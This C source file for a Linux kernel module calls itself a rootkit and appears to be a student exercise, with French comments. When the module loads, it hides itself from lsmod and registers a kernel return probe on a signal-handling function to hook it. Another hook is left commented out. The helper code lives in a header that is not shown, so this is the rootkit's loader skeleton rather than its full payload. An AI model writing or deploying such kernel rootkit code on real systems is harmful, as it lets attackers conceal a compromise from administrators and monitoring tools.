#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("HOOOKING");
MODULE_AUTHOR("2600 student");
MODULE_VERSION("0.0.1");

static int __init rootkit_init(void) {

  int ret;

  printk(KERN_INFO "rootkit: init\n");
  hide_from_lsmod();
 // kprobes_init();

  /* plante quand on essaie d'afficher le contenu de regs->di
  int ret = register_kretprobe(&rootkit_kretprobe);
  if (ret < 0) {
    printk(KERN_INFO "Error registering kretprobe: %d\n", ret);
    return -1;
  }
  printk(KERN_INFO "Planted return probe at %s: %p\n",
  rootkit_kretprobe.kp.symbol_name, rootkit_kretprobe.kp.addr);
  */

  ret = register_kretprobe(&sig_kp);
  if (ret < 0) {
    printk(KERN_INFO "Error registering signal kretprobe: %d\n", ret);
    return -1;
  }
  printk(KERN_INFO "Kretprobe pour signaux inséré à %s: %p\n", sig_kp.kp.symbol_name, sig_kp.kp.addr);

  return 0;
}

static void __exit rootkit_exit(void) {
  printk(KERN_INFO "rootkit: exit\n");
  unregister_kretprobe(&sig_kp);
  printk(KERN_INFO "kprobe %p retiré\n", sig_kp.kp.addr);
}


module_init(rootkit_init);
module_exit(rootkit_exit);
